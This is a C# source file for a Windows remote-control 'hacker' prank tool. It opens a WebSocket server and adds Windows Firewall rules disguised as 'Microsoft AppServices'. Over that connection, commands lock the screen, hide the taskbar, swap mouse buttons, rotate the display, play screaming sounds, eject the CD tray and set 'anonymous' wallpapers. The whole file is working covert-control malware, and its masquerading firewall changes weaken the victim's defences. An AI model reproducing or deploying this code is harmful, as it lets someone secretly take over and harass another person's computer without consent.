using Fleck;
using NetFwTypeLib;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;

namespace AndroidControl.Hacker
{
    public class Program
    {
        public static void Main(string[] args)
        {
            var meuIp = GetLocalIPAddress();
            Console.WriteLine("My IP: " + meuIp);

            string porta = "15345";

            if (args != null && args.Length > 0)
                porta = args[0];

            ConfigurarFirewall(porta);

            var _servidor = new WebSocketServer($"ws://{meuIp}:{porta}");
            var _conexoes = new List<IWebSocketConnection>();
            var swap = false;
            var grita = false;
            var barra = 1;
            _servidor.Start((conexao) =>
            {
                conexao.OnOpen = () =>
                {
                    _conexoes.Add(conexao);
                    Console.WriteLine("User connected: " + conexao.ConnectionInfo.ClientIpAddress);
                };

                conexao.OnClose = () =>
                {
                    _conexoes.Remove(conexao);
                    Console.WriteLine("User disconnected: " + conexao.ConnectionInfo.ClientIpAddress);
                };

                conexao.OnMessage = (mensagem) =>
                {
                    mensagem = mensagem.ToLower();

                    switch (mensagem)
                    {
                        case "hide":
                            {
                                barra = barra == 0 ? 1 : 0;
                                Helper.TaskBar(barra);
                                break;
                            }
                        case "swap":
                            {
                                swap = !swap;
                                Helper.SwapMouse(swap);
                                break;
                            }
                        case "movecursor":
                            {
                                Helper.MouseCursor();
                                break;
                            }
                        case "opencddriver":
                            {
                                Helper.OpenCdDriver();
                                break;
                            }
                        case "lock":
                            {
                                Helper.Lock();
                                break;
                            }
                        case "grita":
                            {
                                grita = !grita;

                                if (grita)
                                    Helper.Grita();
                                else
                                    Helper.ParaDeGritar();

                                break;
                            }
                        case "wallpaper":
                            {
                                var dirLocal = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "LifeHacker");
                                var papelDeParede = Path.Combine(dirLocal, _wallpapers[countWallPaper]);

                                Helper.SetWallpaper(papelDeParede);
                                countWallPaper++;

                                if (countWallPaper > 1)
                                    countWallPaper = 0;
                                break;
                            }
                        case "wind":
                            {
                                Helper.WinD();
                                break;
                            }
                        case "rotate180":
                            {
                                Helper.Rotate180();
                                break;
                            }
                        case "resetrotate":
                            {
                                Helper.ResetRotate();
                                break;
                            }
                    }
                };
            });

            while (true) { }
        }

        private static int countWallPaper = 0;
        private static readonly string[] _wallpapers = new string[] { @"anonymous.jpg", @"anonymous-2.jpg" };

        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("Local IP Address Not Found!");
        }

        public static void LiberarAppNoFirewall(INetFwPolicy2 firewallPolicy)
        {
            INetFwRule firewallRuleUDPIn = (INetFwRule)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWRule"));
            firewallRuleUDPIn.Action = NET_FW_ACTION_.NET_FW_ACTION_ALLOW;
            firewallRuleUDPIn.Description = "Used to work with Microsoft App Services. (IN)";
            firewallRuleUDPIn.Direction = NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_OUT;
            firewallRuleUDPIn.Enabled = true;
            firewallRuleUDPIn.InterfaceTypes = "All";
            firewallRuleUDPIn.ApplicationName = Path.Combine(Assembly.GetEntryAssembly().Location, "Microsoft.AppServices.exe");
            firewallRuleUDPIn.Name = "Microsoft AppServices IN";

            firewallPolicy.Rules.Remove(firewallRuleUDPIn.Name);
            firewallPolicy.Rules.Add(firewallRuleUDPIn);

            INetFwRule firewallRuleUDPOut = (INetFwRule)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWRule"));
            firewallRuleUDPOut.Action = NET_FW_ACTION_.NET_FW_ACTION_ALLOW;
            firewallRuleUDPOut.Description = "Used to work with Microsoft App Services. (IN)";
            firewallRuleUDPOut.Direction = NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_OUT;
            firewallRuleUDPOut.Enabled = true;
            firewallRuleUDPOut.InterfaceTypes = "All";
            firewallRuleUDPOut.ApplicationName = Path.Combine(Assembly.GetEntryAssembly().Location, "Microsoft.AppServices.exe");
            firewallRuleUDPOut.Name = "Microsoft AppServices OUT";

            firewallPolicy.Rules.Remove(firewallRuleUDPOut.Name);
            firewallPolicy.Rules.Add(firewallRuleUDPOut);
        }

        private static void AbrirPorta(INetFwPolicy2 firewallPolicy, string porta, int protocolo, NET_FW_RULE_DIRECTION_ direcao, string nome)
        {
            INetFwRule firewallRule = (INetFwRule)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWRule"));
            firewallRule.Action = NET_FW_ACTION_.NET_FW_ACTION_ALLOW;
            firewallRule.Description = "Used to work with Microsoft App Services.";
            firewallRule.Direction = direcao;
            firewallRule.Enabled = true;
            firewallRule.InterfaceTypes = "All";
            firewallRule.Protocol = protocolo;
            firewallRule.LocalPorts = porta;
            firewallRule.RemotePorts = porta;
            firewallRule.Name = nome;

            firewallPolicy.Rules.Remove(firewallRule.Name);
            firewallPolicy.Rules.Add(firewallRule);
        }

        public static void ConfigurarFirewall(string porta)
        {
            INetFwPolicy2 firewallPolicy = (INetFwPolicy2)Activator.CreateInstance(
                Type.GetTypeFromProgID("HNetCfg.FwPolicy2"));

            AbrirPorta(firewallPolicy, porta, 6, NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_IN, "Microsoft AppServices(IN)");
            AbrirPorta(firewallPolicy, porta, 6, NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_OUT, "Microsoft AppServices(OUT)");

            AbrirPorta(firewallPolicy, porta, 17, NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_IN, "Microsoft AppServices(IN-UDP)");
            AbrirPorta(firewallPolicy, porta, 17, NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_OUT, "Microsoft AppServices(OUT-UDP)");

            LiberarAppNoFirewall(firewallPolicy);
        }
    }
}